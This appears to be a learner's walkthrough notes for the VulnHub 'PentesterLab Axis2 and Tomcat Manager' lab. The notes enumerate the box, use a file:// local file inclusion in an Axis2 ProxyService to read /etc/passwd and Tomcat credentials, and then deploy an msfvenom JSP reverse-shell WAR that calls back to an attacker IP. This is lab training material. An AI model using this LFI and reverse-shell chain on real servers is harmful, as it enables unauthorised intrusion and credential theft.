


---
https://www.vulnhub.com/entry/pentester-lab-axis2-web-service-and-tomcat-manager,72/

\[OS]: Debian
\[Web-Technology]:  Apache httpd 2.2.16, Tomcat 6
\[Hostname]:  
\[IP]:  192.168.56.123
\[USERS]:   
\[CREDENTIALS]:  

**User login - tomcat :: tomcat** 

Manager web login requires **manager** role - manager :: !mp0ss!bl32gu355
Host Manager Login requires **admin** role - admin ::




---
\[To-Try LIST]:  

**Ports**

80 - web service

22 - ssh needs credentials


---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
| ssh-hostkey: 
|   1024 06:90:fe:a4:34:a4:48:25:f9:86:d6:33:9c:53:e1:04 (DSA)
|_  2048 71:82:d3:e1:ba:42:3d:4d:f0:45:3d:30:5b:d7:47:af (RSA)
80/tcp open  http    Apache httpd 2.2.16 ((Debian))
|_http-title: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache/2.2.16 (Debian)


--- 

\[Web Services Enumeration]:   

Exploration says - Tomcat 6
- host manager is admin :: ??
- manager is users with role manager
- users defined in /etc/tomcat6/tomcat-users.xml
- home directory is `CATALINA_HOME` 

```bash

whatweb - nothing much

192.168.56.123/manager/html # tomcat sign-in

192.168.56.123/host-manager/html # tomcat sign-in - restricted to admin


#According to home page
http://192.168.56.123/host-manager/html - admin :: ??

http://192.168.56.123/manager/html - Users with role manager - users defined in /etc/tomcat6/tomcat-users.xml
 


#Dir busting
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30
 
 /examples             (Status: 302) [Size: 0] [--> http://192.168.56.123/examples/]
/manager              (Status: 302) [Size: 0] [--> http://192.168.56.123/manager/]
/axis2                (Status: 302) [Size: 0] [--> http://192.168.56.123/axis2/]
/server-status        (Status: 403) [Size: 295]
/External%5CX-News    (Status: 400) [Size: 0]



# Axis2 is interesting


# admin :: ?? could be brute forced
# must find users

http://192.168.56.123/examples/ #servlets and jsp examples - exploitable
http://192.168.56.123/axis2/axis2-web/HappyAxis.jsp #tons of system properties

#Key findings
Axis2 version 1.6.2
Apache Tomcat/6.0.35


searchsploit tomcat 6.0.35 #not much
searchsploit axis2 #some results including LFI 12721


# In Services list try Version with getVersion operation as specified - Works
http://192.168.56.123/axis2/services/Version/getVersion 
#Axis2 calls services with http://URL/method?parameters


# Now the other listed thing is ProxyService - page tells us operation "get"
http://192.168.56.123/axis2/services/ProxyService/get #nothing

#We know operation is configured so what parameters does it need?
# Click on and read the wsdl - 
http://192.168.56.123/axis2/services/ProxyService?wsdl

# Can see get operation as specified
operation name = "get"
input message="tns.getRequest" wsaw:Action="urn.get"
input message="tns.getResponse" wsaw:Action="urn.getResponse"

#So it uses getRequest and returns getResponse - what params does get request need?
# We can see getRequest messager definition 

message name = "getRequest"
part name="parameters" elements="ns:get"

#What is ns:get? must find the element definition 
element name="get" ..... element name="uri" 

# So the get element contains a paramater "uri" - this means we need to call it 
http://192.168.56.123/axis2/services/ProxyService/get?uri=<value>

#Lets test if the LFI is present
http://192.168.56.123/axis2/services/ProxyService/get?uri=file:///etc/passwd
#works - user, root

# Remember the main page: Users are defined in `/etc/tomcat6/tomcat-users.xml`.

http://192.168.56.123/axis2/services/ProxyService/get?uri=file:////etc/tomcat6/tomcat-users.xml #works

<user username="tomcat" password="tomcat" roles="tomcat"/> <user username="manager" password="!mp0ss!bl32gu355" roles="tomcat,manager-gui"/> </tomcat-users>


```

![[Pasted image 20251102081834.png]]
![[Pasted image 20251102090413.png]]
```bash


# OK WE HAVE LOGGED IN AS MANAGER at http://192.168.56.123/manager/html
searchsploit Tomcat 6.0.35 
#couple results - we know tomcat runs jsp and servlets - there is a jsp one

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war

#Browse and deploy war file - click on the deployed file 

nc -nlvp 4444 #CONNECTION SUCCESS THIS ONE TOOK SO LONG




```

---


\[OTHER / PRIVILEGE-ESCALATION]:   


```bash
whoami #tomcat6

#persistence - script been clutch lately
script /dev/null -c bash

#which
/usr/bin/perl
/usr/bin/wget
/bin/nc

cd /home/user

ls -la
cat .su-to-rootrc
-> SU_TO_ROOT_SU=sudo


# No privesc on this machine apparently but if 

```

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
